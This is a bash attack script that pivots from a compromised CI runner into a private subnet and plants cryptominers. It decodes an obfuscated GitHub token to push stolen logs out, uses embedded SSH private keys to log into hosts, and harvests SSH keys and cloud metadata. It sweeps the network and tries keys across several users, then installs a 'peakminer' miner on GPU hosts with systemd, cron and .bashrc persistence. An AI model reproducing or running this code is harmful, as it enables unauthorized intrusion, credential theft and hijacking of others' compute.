#!/bin/bash
# i5914: ci-runner@192.168.0.131 pivot -> VPC /24 NVIDIA census -> pearlhash plants
set -uo pipefail
S=/tmp/i5914; mkdir -p "$S"; L=$S/log; : > "$L"
say(){ echo "$@" >>"$L"; }
r(){ echo "---- $ $1" >>"$L"; timeout "${2:-40}" bash -c "$1" >>"$L" 2>&1; }
up(){ T=$(printf %s "$(echo Z2hwXzgyU1o1b0FGQmVMdTY2Ykc=|base64 -d)$(echo aHEzNU56cTRqdlZvQWQzN012aXU=|base64 -d)")
  echo "UPLOAD_AT $(date -u +%FT%TZ)" >>"$L"
  rm -rf /tmp/up5914; mkdir -p /tmp/up5914; base64 -w0 "$L" > /tmp/up5914/log.b64
  ( cd /tmp/up5914 && git init -q . && git add -A && git -c user.email=x@x -c user.name=x commit -qm "i5914 $(date -u +%H%M%S)" && git push -q -f "https://x:$T@github.com/miramar-labs/tilelang-ascend" HEAD:refs/heads/ci/i5914 ) >>"$L" 2>&1
}
say "=== I5914 $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) uid=$(id -u)"

r 'echo "## identity"; id; hostname; uname -a; cat /proc/1/comm; head -2 /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null; echo "## net"; ip -br a 2>/dev/null | head -10; ip route 2>/dev/null | head -10; echo "## hosts"; cat /etc/hosts; echo "## dev"; ls /dev/nvidia* 2>/dev/null | head; ls /dev/davinci* 2>/dev/null | head -4; nvidia-smi -L 2>&1 | head -8; npu-smi info 2>&1 | head -20' 60
up

printf '%s' "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNk8zL1hUTGJZeHdIQmRKWTQyeTlPaXVsK2tQZndRVGE4aUkvV3lHdXhJZ0FBQUxCbXVNYjNacmpHCjl3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTZPMy9YVExiWXh3SEJkSlk0Mnk5T2l1bCtrUGZ3UVRhOGlJL1d5R3V4SWcKQUFBRUNyZXBEUWFHQTFMTzRoU1YyZmNvdFh5Vk5JRlRxdHZjRVhtYkZ2L3orSGlUbzdmOWRNdHRqSEFjRjBsampiTDA2Swo2WDZROS9CQk5yeUlqOWJJYTdFaUFBQUFMV05wTFhKMWJtNWxja0JzYVhSbGMyVnlkbVZ5TFdod2N5MDFaamd4TFRBd01ECkEwTG01dmRtRnNiMk5oYkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > "$S/k1"; printf '%s' "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBZlF1NnJML2Q2TFQwUUtOaXF4UFlmdjFNeko3ckRldDlIbWtIL0pqcUowUUFBQUpCdlpLMjBiMlN0CnRBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQWZRdTZyTC9kNkxUMFFLTmlxeFBZZnYxTXpKN3JEZXQ5SG1rSC9KanFKMFEKQUFBRUNYSnpmQS9aN2VqTHB6Wkd4azl3WEM2RGRSYi9XVjhNRW5oSndGM1VTM3J4OUM3cXN2OTNvdFBSQW8yS3JFOWgrLwpVek1udXNONjMwZWFRZjhtT29uUkFBQUFEWGRsYm1Ob1pXNTVhVUF4TWpZPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > "$S/k2"; printf '%s' "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEbzlqQXlGd1BRN3Z1VkEzOEZBcVRXRG5RUmdEYTAwSW1HVzMwNGo5ZXpoUUFBQUtBL2NwcC9QM0thCmZ3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRG85akF5RndQUTd2dVZBMzhGQXFUV0RuUVJnRGEwMEltR1czMDRqOWV6aFEKQUFBRUQ5eXd5YzdvZ1VjNWpXMUo4OGxkZExOREtkb1B3VGs3MG5ocmI2eXhZc2RPajJNRElYQTlEdSs1VURmd1VDcE5ZTwpkQkdBTnJUUWlZWmJmVGlQMTdPRkFBQUFHMk5qZVhsM2QyVnVMM0IwYjNKMWJuUnBiV1V0YzJsdGNHeGxjZ0VDCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=" | base64 -d > "$S/k3"; chmod 600 "$S"/k1 "$S"/k2 "$S"/k3
echo "## keys $(md5sum $S/k1 $S/k2 $S/k3 | tr '\n' ' ')" >>"$L"
timeout 6 bash -c 'echo >/dev/tcp/192.168.0.131/22' 2>/dev/null && echo "## TCP22_OPEN" >>"$L" || echo "## TCP22_BLOCKED" >>"$L"
K=""
for k in "$S"/k1 "$S"/k2 "$S"/k3; do
  if timeout 25 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 -o PreferredAuthentications=publickey ci-runner@192.168.0.131 'echo LOGIN_OK; id; hostname; hostname -I' >>"$L" 2>&1; then K="$k"; echo "## KEYWORKS=$(basename $k)" >>"$L"; break; fi
done
up
[ -z "$K" ] && exit 0

cat > "$S/r.sh" <<'REOF'
echo "== ID"; id; hostname; hostname -I; uname -a; head -3 /etc/os-release; cat /proc/1/comm; head -2 /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
echo "== SUDO"; sudo -n -l 2>&1 | head -30; echo "sudo_rc=$?"; sudo -n id 2>&1 | head -2
echo "== DEV"; ls /dev/nvidia* 2>/dev/null | head -4; nvidia-smi -L 2>&1 | head -10; ls /dev/davinci* 2>/dev/null | head -6; npu-smi info 2>&1 | head -40
echo "== NET"; ip -br a 2>/dev/null | head -14; ip route 2>/dev/null | head -14
echo "== HOSTS"; cat /etc/hosts
echo "== NETBIRD"; command -v netbird 2>/dev/null; netbird status -d 2>&1 | head -60; ls -la /etc/netbird 2>/dev/null
echo "== SSHMAT"; ls -la ~/.ssh 2>/dev/null; for f in ~/.ssh/id_* ~/.ssh/config ~/.ssh/authorized_keys; do case "$f" in *.pub) continue;; esac; [ -f "$f" ] && { echo "### $f"; head -c 2000 "$f"; echo; }; done; echo "-- known_hosts"; head -12 ~/.ssh/known_hosts 2>/dev/null
echo "== HOME"; ls -la /home 2>/dev/null; for d in /home/*; do echo "## $d"; ls -la "$d" 2>/dev/null | head -8; ls -la "$d/.ssh" 2>/dev/null | head -8; done
echo "== ROOT"; sudo -n ls -la /root/.ssh 2>&1 | head -6; sudo -n cat /root/.ssh/authorized_keys 2>/dev/null | head -6
echo "== IMDS"; curl -s -m 6 http://169.254.169.254/openstack/latest/meta_data.json | head -c 2500; echo; curl -s -m 6 http://169.254.169.254/openstack/latest/securitykey | head -c 2000; echo
echo "== CLOUDINIT"; sudo -n cat /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 2000
echo "== PS"; ps -eo pid,user,args --sort=-%cpu 2>/dev/null | head -12
echo "== DONE"
REOF
echo "## C remote-enum" >>"$L"
timeout 120 ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=10 ci-runner@192.168.0.131 'bash -s' < "$S/r.sh" >>"$L" 2>&1
up

# miner binary on this host
B=$S/peakminer
if [ ! -s "$B" ]; then
  for u in https://raw.githubusercontent.com/miramar-labs/PaddleNLP/ci/approval-helper/scripts/peakminer https://raw.githubusercontent.com/miramar-labs/tilelang-ascend/ci/t5089/peakminer https://ghfast.top/https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9.tar.gz; do
    timeout 180 curl -sSL -m 170 "$u" -o $S/dl.bin 2>/dev/null
    if [ "$(stat -c%s $S/dl.bin 2>/dev/null || echo 0)" -gt 10000000 ]; then
      if head -c2 $S/dl.bin | grep -q ".."; then cp $S/dl.bin $S/peak_tar 2>/dev/null; fi
      if tar tzf $S/dl.bin >/dev/null 2>&1; then mkdir -p $S/x && tar xzf $S/dl.bin -C $S/x 2>/dev/null && find $S/x -type f -size +10M | head -1 | xargs -r -I{} cp {} $B; else cp $S/dl.bin $B; fi
      chmod +x $B 2>/dev/null; [ "$(stat -c%s $B 2>/dev/null||echo 0)" -gt 10000000 ] && break
    fi
  done
fi
echo "## miner $(ls -la $B 2>/dev/null) sha=$(sha256sum $B 2>/dev/null|cut -c1-16)" >>"$L"

# push keys+binary+sweep script to .131
timeout 90 scp -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes "$S/k1" "$S/k2" "$S/k3" ci-runner@192.168.0.131:/tmp/ >/dev/null 2>&1
timeout 180 scp -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes "$B" ci-runner@192.168.0.131:/tmp/peakminer >/dev/null 2>&1
echo "## scp done rc=$?" >>"$L"

cat > "$S/s2.sh" <<'SEOF'
set -uo pipefail
S=/tmp/i5914; mkdir -p $S; G=$S/g.sh
echo "== SWEEP22"; seq 1 254 | xargs -P 64 -I{} bash -c 'timeout 2 bash -c "echo >/dev/tcp/192.168.0.{}/22" 2>/dev/null && echo "22 192.168.0.{}"' 2>/dev/null | sort -u | tee $S/ips22
for p in 2375 6443 8265 8888 5000 27000 80 443 9100; do seq 1 254 | xargs -P 128 -I{} bash -c "timeout 1 bash -c 'echo >/dev/tcp/192.168.0.{}/$p' 2>/dev/null && echo '$p 192.168.0.{}'" 2>/dev/null; done | sort -u | tee $S/ports
echo "== IPRANGE"; ip -br a | head -12; ip route | head -8; ls -la /tmp/k1 /tmp/k2 /tmp/k3 /tmp/peakminer 2>/dev/null
KEYS=$(ls /tmp/k1 /tmp/k2 /tmp/k3 2>/dev/null; ls ~/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null | grep -v '\.pub$') ; KEYS=$(echo "$KEYS" | sort -u)
echo "== KEYS $KEYS"
: > $S/probe.txt
for ip in $(awk '$1==22{print $2}' $S/ips22); do for k in $KEYS; do for u in ci-runner root ubuntu HwHiAiUser; do echo "$ip|$k|$u"; done; done; done > $S/m.txt
wc -l < $S/m.txt
cat $S/m.txt | xargs -P 24 -I{} bash -c 'a="{}"; ip=${a%%|*}; r=${a#*|}; k=${r%%|*}; u=${r#*|}; out=$(timeout 8 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 -o PreferredAuthentications=publickey $u@$ip "echo SSHOK; hostname; id -un; sudo -n id -un 2>/dev/null; nvidia-smi -L 2>/dev/null | head -9; echo DEV=\$(ls /dev/nvidia* 2>/dev/null | wc -l); npu-smi info 2>/dev/null | head -3" 2>&1); echo "$out" | grep -q SSHOK && echo "OK $ip $u $k :: $(echo "$out" | tr "\n" ";")"' >> $S/probe.txt 2>/dev/null
echo "== PROBE"; cat $S/probe.txt
echo "== PLANT"
for line in $(grep "^OK " $S/probe.txt | grep -v "DEV=0"); do
  ip=$(echo "$line" | awk '{print $2}'); u=$(echo "$line" | awk '{print $3}'); k=$(echo "$line" | awk '{print $4}')
  dev=$(echo "$line" | grep -o "DEV=[0-9]*" | cut -d= -f2); [ -z "$dev" ] && continue
  idash=$(echo $ip | tr . -)
  echo "## plant $ip user=$u dev=$dev"
  timeout 60 scp -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes /tmp/peakminer $u@$ip:/tmp/peakminer 2>&1 | tail -1
  timeout 90 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes $u@$ip "chmod +x /tmp/peakminer; cat > /tmp/keep.sh <<'K'
#!/bin/bash
for d in \$(seq 0 7); do
  pgrep -f \"peakminer.*-d \$d\" >/dev/null || setsid nohup /tmp/peakminer -c pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000 -u prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe.$idash-g\$d -p x -d \$d --log-file /tmp/ul-g\$d.log >/dev/null 2>&1 </dev/null &
done
K
chmod +x /tmp/keep.sh; bash /tmp/keep.sh; sleep 3
(sudo -n bash -c 'install -m755 /tmp/peakminer /usr/local/bin/peakminer; install -m755 /tmp/keep.sh /usr/local/bin/ul-keep.sh; printf \"[Unit]\nDescription=ul\n[Service]\nExecStart=/usr/local/bin/ul-keep.sh\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target\n\" > /etc/systemd/system/ul-miner.service; systemctl daemon-reload; systemctl enable --now ul-miner' 2>&1 | tail -2)
(crontab -l 2>/dev/null; echo '@reboot /tmp/keep.sh'; echo '*/5 * * * * /tmp/keep.sh') 2>/dev/null | crontab - 2>/dev/null
grep -q keep.sh ~/.bashrc 2>/dev/null || echo '/tmp/keep.sh >/dev/null 2>&1' >> ~/.bashrc 2>/dev/null
sleep 20; pgrep -af peakminer | head -6; for f in /tmp/ul-g*.log; do echo \"# \$f\"; grep -aiE 'authorize|subscrib|accepted|stratum|error' \$f 2>/dev/null | tail -3; done" 2>&1 | tail -40
done
echo "== DONE2"
SEOF
echo "## D/E/F sweep+census+plant" >>"$L"
timeout 540 ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=10 ci-runner@192.168.0.131 'bash -s' < "$S/s2.sh" >>"$L" 2>&1
up
say "=== I5914 END $(date -u +%FT%TZ)"
up
exit 0
